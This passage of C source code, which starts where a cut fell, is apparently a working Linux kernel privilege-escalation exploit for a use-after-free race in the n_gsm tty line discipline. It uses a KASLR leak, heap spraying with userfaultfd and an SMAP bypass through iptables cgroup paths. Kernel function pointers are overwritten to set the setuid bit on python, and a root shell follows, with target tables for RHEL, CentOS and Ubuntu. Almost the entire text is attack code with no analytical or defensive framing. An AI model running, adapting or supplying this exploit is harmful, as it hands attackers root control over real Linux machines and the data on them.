	if(sched_setaffinity(0, sizeof(set), &set)) die("sched_setaffinity failed, too few cores?");
}

static int get_cores()
{
	FILE *f;
	char buf[256];
	int cnt = 0;

	f = fopen("/proc/cpuinfo", "r");
	if(!f) die("/proc/cpuinfo?");

	while(1)
	{
		fgets(buf, sizeof buf, f);
		if(strstr(buf, "MHz")) cnt++;

		if(feof(f) || ferror(f)) break;
	}

	fclose(f);

	return cnt;
}

static void prepare_smap_bypass(char *payload)
{
	pid_t pid;
	int fd;
	char buf[128];
	int a[2];
	int b[2];
	char c;
	char path[128];

	if(pipe(a) < 0) die("pipe");
	if(pipe(b) < 0) die("pipe");

	pid = fork();

	if(pid < 0) die("fork");

	if(pid == 0)
	{
		unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET);

		write(a[1], &c, 1);
		read(b[0], &c, 1);

		system("mount -t tmpfs tmpfs /run");

		fd = open("/dev/null", O_RDONLY);
		if(fd < 0) die("open");

		if(dup2(fd, 2) < 0) die("dup2");

		execl("/sbin/iptables", "iptables", "-A", "OUTPUT", "-m", "cgroup", "--path", payload, "-j", "LOG", NULL);
		exit(1);
	}

	read(a[0], &c, 1);

	snprintf(path, sizeof path, "/proc/%u/setgroups", pid);

	fd = open(path, O_RDWR);
	if(!fd) die("open");

	strcpy(buf, "deny");

	if(write(fd, buf, strlen(buf)) != strlen(buf)) die("write");
	close(fd);

	snprintf(path, sizeof path, "/proc/%u/uid_map", pid);

	fd = open(path, O_RDWR);
	if(fd < 0) die("open");

	snprintf(buf, sizeof buf, "0 %d 1", getuid());

	if(write(fd, buf, strlen(buf)) != strlen(buf)) die("write");
	close(fd);

	snprintf(path, sizeof path, "/proc/%u/gid_map", pid);

	fd = open(path, O_RDWR);
	if(fd < 0) die("open");

	snprintf(buf, sizeof buf, "0 %d 1", getgid());

	if(write(fd, buf, strlen(buf)) != strlen(buf)) die("write");
	close(fd);

	write(b[1], &c, 1);

	close(a[0]);
	close(a[1]);
	close(b[0]);
	close(b[1]);

	wait(NULL);
}


static void sigusr1(int dummy)
{
}


static void *sprayer_func(void *x)
{
	char *buf = (char*)0x11370000;
	char c;
	int i = (long)x;

	sprayer_tids[i] = gettid();

	read(sprayer_pipe[0], &c, 1);
	syscall(__NR_add_key, "user", "wtf", buf + 4096 - 1023, 1024, -123);
	die("unreachable");

	return NULL;
}


static void sprayer()
{
	char *buf;
	char *cp;
	struct uffdio_api api = { .api = UFFD_API, .features = UFFD_FEATURE_MISSING_SHMEM };
	struct uffdio_register reg;
	long i;
	pid_t pid;
	pthread_t pts[NUM_SPRAY];

	pipe(sprayer_pipe);
	pipe(sprayer_pipe2);

	pid = fork();

	if(pid < 0) die("fork");

	if(!pid)
	{
		if(prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) < 0) die("prctl");

		buf = mmap((void*)0x11370000, 4096*2, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

		if(!buf) die("buf");

		memset(buf, 0, 4096);

		cp = buf + 4096 - 1023;
		*(unsigned long*)cp = kernel_base + selected_kernel->kernfs_pr_cont_buf; // dlci->gsm

		cp = buf + 4096 - 1023 + 8;
		*(unsigned long*)cp = 0xdeadbeefdeadbeef; // dlci->addr/state, state != 0 != 3

		cp = buf + 4096 - 1023 + 80;
		*(unsigned long*)cp = kernel_base + selected_kernel->kmem_cache_size; // dlci->t1.function, dummy call


		ufd_fd = syscall(SYS_userfaultfd, O_NONBLOCK);
		if(ufd_fd < 0) die("userfaultfd");

		if(ioctl(ufd_fd, UFFDIO_API, &api)) die("UFFDIO_API");

		memset(&reg, 0, sizeof reg);
		reg.mode = UFFDIO_REGISTER_MODE_MISSING;
		reg.range.start = (unsigned long)buf;
		reg.range.len = 4096*2;

		if(ioctl(ufd_fd, UFFDIO_REGISTER, &reg)) die("UFFDIO_REGISTER");

		memset(&sprayer_tids, 0, sizeof sprayer_tids);

		for(i = 0; i < NUM_SPRAY; i++)
		{
			if(pthread_create(&pts[i], NULL, sprayer_func, (void*)i)) die("pthread_create");
		}

		for(i = 0; i < NUM_SPRAY; i++)
		{
			while(get_state(getpid(), sprayer_tids[i]) == 'R');
		}

		if(signal(SIGUSR1, sigusr1) == SIG_ERR) die("signal");
		if(prctl(PR_SET_PDEATHSIG, SIGUSR1, 0, 0, 0) < 0) die("prctl");

		// signal sprayer threads done
		write(sprayer_pipe2[1], &i, 1);

		sleep(60); // this gets interrupted if the parent exits
		sleep(5);
		exit(1);
	}

	sprayer_pid = pid;

}

static void cleanup_spray()
{
	close(sprayer_pipe[0]);
	close(sprayer_pipe[1]);
	close(sprayer_pipe2[0]);
	close(sprayer_pipe2[1]);
}


static void skip_msg1(int fd)
{
	unsigned char c;
	int sofs = 0;

	while(sofs != 2)
	{
		if(read(fd, &c, 1) != 1) die("read");
		if(c == GSM1_SOF) sofs++;
	}
}


static void send_control_msg1(int fd, unsigned char addr, unsigned char control, unsigned char cr)
{
	unsigned char cbuf[6];

	cbuf[0] = GSM1_SOF;
	cbuf[1] = (addr << 2) | (cr << 1) | EA;
	cbuf[2] = control;
	cbuf[3] = 0xFF - gsm_fcs_add_block(INIT_FCS, cbuf + 1, 2);
	cbuf[4] = GSM1_SOF;

	if(write(fd, cbuf, 5) != 5) die("write");
	if(tcdrain(fd)) die("tcdrain");
}


static void send_control_cmd1(int fd, unsigned char addr, unsigned char control, unsigned char command, unsigned char cr)
{
	unsigned char cbuf[8];
	int i;
	unsigned char fc;

	cbuf[0] = GSM1_SOF;
	cbuf[1] = (addr << 2) | (cr << 1) | EA;
	cbuf[2] = control;
	cbuf[3] = (command << 1) | EA; // command
	cbuf[4] = EA; // command data len 0

	fc = gsm_fcs_add_block(INIT_FCS, &cbuf[1], 4);

	for(i = 0; i < 256; i++)
	{
		fc = gsm_fcs_add_block(INIT_FCS, &cbuf[1], 2);
		cbuf[5] = i;
		fc = gsm_fcs_add_block(fc, &cbuf[5], 1);

		fc = gsm_fcs_add_block(fc, &cbuf[3], 2);
		if(fc == 0xcf) break;
	}

	cbuf[6] = GSM1_SOF;

	if(write(fd, cbuf, 7) != 7) die("write");
	if(tcdrain(fd)) die("tcdrain");
}


static void *thread_func(void *arg)
{
	int id = (long)arg;
	char *b = malloc(NUM_SPRAY);
	char c;

	memset(b, 0, NUM_SPRAY);

	tids[id] = gettid();

	if(id == 0) set_core(0);
	if(id == 1) set_core(1);

	if(id == 2)
	{
		if(num_cores >= 3) set_core(2);
		else set_core(0);
	}

	if(id == 3) set_core(1);

	if(pthread_barrier_wait(&barr1) < PTHREAD_BARRIER_SERIAL_THREAD) die("pthread_barrier_wait");

	if(id == 0)
	{
		// change t1, need_restart
		gsm_conf.t1 += 1;
		if(ioctl(gsm_slave_fd, GSMIOC_SETCONF, &gsm_conf)) die("setconf");

		t0_done = 1;
	}
	else if(id == 1)
	{
		struct sched_param params;
		memset(&params, 0, sizeof params);
		if(sched_setscheduler(0, SCHED_IDLE, &params)) die("sched_setscheduler");

		if(pthread_barrier_wait(&barr2) < PTHREAD_BARRIER_SERIAL_THREAD) die("pthread_barrier_wait");

		gsm_conf.t1 -= 1;
		gsm_conf.t2 += 1;

		ioctl(gsm_slave_fd, GSMIOC_SETCONF, &gsm_conf);
		if (!getuid()) execve("/bin/sh", (char **){ NULL }, NULL);
		t1_done = 1;
	}
	else if(id == 2)
	{
		skip_msg1(gsm_master_fd);
		while(get_state(getpid(), tids[0]) != 'D');

		// open dlci
		send_control_msg1(gsm_master_fd, 0, SABM|PF, 0);
		skip_msg1(gsm_master_fd);

		// let t0 go and get stuck on wait_event_interruptible(gsm->event, dlci->state == DLCI_CLOSED);
		send_control_cmd1(gsm_master_fd, 0, UI, CMD_CLD & ~1, 1);
		skip_msg1(gsm_master_fd);

		while(get_state(getpid(), tids[0]) != 'S');

		// let t1 go and get stuck on the disconnect (ctrl wait)
		if(pthread_barrier_wait(&barr2) < PTHREAD_BARRIER_SERIAL_THREAD) die("pthread_barrier_wait");
		skip_msg1(gsm_master_fd);

		while(get_state(getpid(), tids[1]) != 'D');

		// start spinner(s?)
		if(pthread_barrier_wait(&barr3) < PTHREAD_BARRIER_SERIAL_THREAD) die("pthread_barrier_wait");

		while(get_state(getpid(), tids[3]) != 'R');

		// let t1 go and be woken, but hopefully still sleep in the wait
		send_control_msg1(gsm_master_fd, 0, SABM|PF, 0); // reopen dlci 0
		skip_msg1(gsm_master_fd);
		send_control_cmd1(gsm_master_fd, 0, UI, CMD_CLD & ~1, 1); // respond to control

		while(1)
		{
			c = get_state(getpid(), tids[1]);
			if(c == 'R') break; // started running
			if(c == 0) break; // exited
		}

		// let t0 go and free the dlci
		send_control_msg1(gsm_master_fd, 0, DISC|PF, 0); // disconnect
		skip_msg1(gsm_master_fd); // can ignore this?

		while(!t0_done);

		write(sprayer_pipe[1], b, NUM_SPRAY);

		read(sprayer_pipe2[0], b, 1);
		t2_done = 1;

		return NULL;


	}
	else if(id == 3)
	{
		if(pthread_barrier_wait(&barr3) < PTHREAD_BARRIER_SERIAL_THREAD) die("pthread_barrier_wait");

		while(!t2_done);

	}
	else die("bad id");

	return NULL;
}

static void *fastopen(void *arg)
{
	skip_msg1(gsm_master_fd);
	send_control_msg1(gsm_master_fd, 0, SABM|PF, 0);
	skip_msg1(gsm_master_fd);
	send_control_cmd1(gsm_master_fd, 0, UI, CMD_CLD & ~1, 1);
	skip_msg1(gsm_master_fd);
	send_control_msg1(gsm_master_fd, 0, DISC|PF, 0);
	skip_msg1(gsm_master_fd);

	return NULL;
}

static void setup_tty(int *master_fd, int *slave_fd)
{
	char *pts;
	int arg;
	pthread_t fo;

	// set up sploit mux
	*master_fd = open("/dev/ptmx", O_RDWR|O_CLOEXEC);
	if(*master_fd < 0) die("open");

	if(grantpt(*master_fd)) die("grantpt");
	if(unlockpt(*master_fd)) die("unlockpt");

	pts = ptsname(*master_fd);
	if(!pts) die("ptsname");

	*slave_fd = open(pts, O_RDWR|O_CLOEXEC);

	if(*slave_fd < 0) die("open");

	arg = N_GSM0710;
	if(ioctl(*slave_fd, TIOCSETD, &arg)) die("ioctl");

	if(ioctl(*slave_fd, GSMIOC_GETCONF, &gsm_conf)) die("getconf");

	gsm_conf.t2 = 2000;
	gsm_conf.t1 = 1;
	gsm_conf.n2 = 3;

	// speed up the opening with a gsm1 sequence
	if(pthread_create(&fo, NULL, fastopen, (void*)0)) die("pthread_create");

	if(ioctl(*slave_fd, GSMIOC_SETCONF, &gsm_conf)) die("setconf");

	pthread_join(fo, NULL);

}


static void setup_payload()
{
	char *buf, *tmp;
	unsigned long *lp;

	if(payload_setup) return;

	buf = malloc(512);
	if(!buf) die("malloc");

	memset(buf, 'B', 512);

	buf[512 - 1] = 0;

	tmp = buf;
	memset(tmp, '/', 180);
	tmp = buf + 180;
	memcpy(tmp, "/a/b/c/d", 8);

	tmp = buf + 200;
	lp = (unsigned long*)tmp;
	*lp = kernel_base + selected_kernel->run_cmd;
	if (!selected_kernel->run_cmd) *lp = kernel_base + selected_kernel->commit_creds;

	tmp = buf + 224;
	lp = (unsigned long*)tmp;
	*lp = kernel_base + selected_kernel->kernfs_pr_cont_buf + 224 + 8;
	if (!selected_kernel->run_cmd) *lp = kernel_base + selected_kernel->init_cred;

	tmp = buf + 224 + 8;
	*tmp = 0;

	if(!access("/usr/bin/chmod", F_OK)) strcat(tmp, "/usr");

	strcat(tmp, "/bin/chmod u+s ");
	strcat(tmp, python_path());

	prepare_smap_bypass(buf);

	memset(buf, 'C', 512);

	tmp = buf;
	memset(tmp, '/', 112);
	tmp = buf + 112;
	memcpy(tmp, "/a/b/c/d", 8);

	tmp = buf + 144;
	lp = (unsigned long*)tmp;

	*lp = kernel_base + selected_kernel->__rb_free_aux;

	buf[144 + 8] = 0;

	prepare_smap_bypass(buf);

	free(buf);

	payload_setup = 1;
}

static void setup()
{
	select_kernel();
	kernel_base = xen_kaslr_leak();

	kernel_base -= selected_kernel->hypercall_page;

	notice("Found kernel .text, 0x%.16lx", kernel_base);

	sprayer();

	num_cores = get_cores();
	if(num_cores < 2) die("need at least 2 cores");
	if(num_cores < 3) warn("need at least 3 cores ideally, found %u", num_cores);

	// alloc the dlci on core 2
	if(num_cores >= 3) set_core(2);
	else set_core(1);

	setup_tty(&gsm_master_fd, &gsm_slave_fd);
	setup_payload();

	// thread globals
	if(pthread_barrier_init(&barr1, NULL, 4)) die("pthread_barrier_init");
	if(pthread_barrier_init(&barr2, NULL, 2)) die("pthread_barrier_init");
	if(pthread_barrier_init(&barr3, NULL, 2)) die("pthread_barrier_init");
	if(pthread_barrier_init(&barr4, NULL, 2)) die("pthread_barrier_init");
	t0_done = 0;
	t1_done = 0;
	t2_done = 0;

	if(signal(SIGUSR1, sigusr1) == SIG_ERR) die("signal");
}

static void cleanup()
{
	if(gsm_slave_fd != -1) close(gsm_slave_fd);
	gsm_slave_fd = -1;
	if(gsm_master_fd != -1) close(gsm_master_fd);
	gsm_master_fd = -1;

	cleanup_spray();

	memset(&tids, 0, sizeof tids);
	t0_done = t1_done = t2_done = 0;

	pthread_barrier_destroy(&barr1);
	pthread_barrier_destroy(&barr2);
	pthread_barrier_destroy(&barr3);
	pthread_barrier_destroy(&barr4);
}

static int do_sploit()
{
	time_t stime;

	pthread_t thread0;
	pthread_t thread1;
	pthread_t thread2;
	pthread_t thread3;

	setup();

	if(pthread_create(&thread0, NULL, thread_func, (void*)0)) die("pthread_create");
	if(pthread_create(&thread1, NULL, thread_func, (void*)1)) die("pthread_create");
	if(pthread_create(&thread2, NULL, thread_func, (void*)2)) die("pthread_create");
	if(pthread_create(&thread3, NULL, thread_func, (void*)3)) die("pthread_create");

	pthread_join(thread0, NULL);
	pthread_join(thread2, NULL);
	pthread_join(thread3, NULL);

	stime = time(NULL);
	while(time(NULL) - stime <= 10)
	{
		if(t1_done) break;
		if(get_state(getpid(), tids[1]) == 'S') break;
	}

	if(!t1_done)
	{
		notice("UAF seems to have hit");
		tkill(tids[1], SIGUSR1);
	}
	else
	{
		info("UAF seems to have missed :(");
	}

	pthread_join(thread1, NULL);
	cleanup();

	return 0;
}

static int check_win()
{
	struct stat st;

	if(stat(python_path(), &st)) die("stat");

	return st.st_mode & S_ISUID;
}

static void spawn_shell()
{
	execl(python_path(), "python", "-c", PYTHON_PAYLOAD, NULL);
	die("exec");
}

int main(int argc, const char *argv[])
{
	int i;

	if (argv[1] && strstr(argv[1], "rhel"))
		kernel_table = kernels_rhel;
	if (argv[1] && strstr(argv[1], "centos"))
		kernel_table = kernels_centos;
	if (argv[1] && strstr(argv[1], "ubuntu"))
		kernel_table = kernels_ubuntu;
	if (!kernel_table) {
		printf("USAGE: ./exploit <rhel|centos|ubuntu>\n");
		return 0;
	}

	for(i = 0; i < EXPLOIT_TRIES; i++)
	{
		notice("Attempt %d/%d", i + 1, EXPLOIT_TRIES);
		do_sploit();
		if(check_win())
		{
			notice("Payload ran correctly, spawning shell");
			spawn_shell();
		}
		else
		{
			info("Payload failed to run");
		}
	}

	return 0;
}